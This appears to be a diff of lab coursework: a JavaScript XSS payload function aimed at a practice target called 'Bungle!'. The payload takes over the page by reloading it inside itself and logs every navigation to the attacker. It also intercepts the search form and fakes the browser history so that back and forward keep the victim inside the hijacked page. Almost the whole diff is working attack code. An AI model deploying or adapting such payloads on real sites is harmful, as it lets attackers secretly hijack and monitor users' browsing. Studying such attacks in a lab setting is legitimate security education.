@@ -18,22 +18,56 @@ function payload(attacker) {
 			proxy("http://permalink.co/");
 		});
 	}
+	function back_helper(href){
+		hist_stack.push(href);
+		uid++;
+		window.history.pushState({UID: uid},"",href);
+	}
+	var hist_stack = new Array();
+	var fwd_stack = new Array();
+	var uid = 0;
+	var this_uid;
+	//var prev_uid;
 	function proxy(href) {
+				
+			//history.replaceState(window.history.state, "", href);
+			if(window.history.state == null)
+				history.replaceState({UID: uid},"",href);
+			
+			this_uid = window.history.state.UID;
+			console.log("this_uid: " + this_uid);
+			console.log("hist_stack: ", hist_stack);
+			console.log("fwd_stack: ", fwd_stack);
+
 		$("html").load(href, function(){
 			$("html").show();
 			log({event: "nav", uri: href});
 			$("#query").val("pwned!");
 
-/*
-			window.addEventListener("popstate", function(e) {
-				proxy(history.)
-			});
-*/
+			//window.removeEventListener("popstate", popstate_handler);
+			//window.addEventListener("popstate", popstate_handler(event));
 
-			var stateObj = {
-			    foo: "bar"
+			window.onpopstate = function(e){
+				var next_uid = e.state.UID;
+				var top;
+				console.log("popstate detected");
+				console.log("next_uid: " + next_uid);
+				
+				console.log(e);
+				if(next_uid < this_uid){
+					console.log("***************back button*******************");
+					top = hist_stack.pop();
+					fwd_stack.push(href);
+					proxy(top);
+				}
+				else {
+					console.log("****************forward button******************");
+					top = fwd_stack.pop();
+					hist_stack.push(href);
+					proxy(top);
+				}
+
 			};
-			history.pushState(proxy(href), "", href);
 			
 
 			// Bungle! link
@@ -47,9 +81,9 @@ function payload(attacker) {
 			$('form[action="./search"]').on("submit", function(event) {
 				usersSearch = document.getElementById('query').value;
 				event.preventDefault();
+				back_helper(href);
 				var target_link = "http://permalink.co/search?q=" + usersSearch;
 				proxy(target_link);
-				alert("Search_form_alert");
 			});
 
 			// Search again
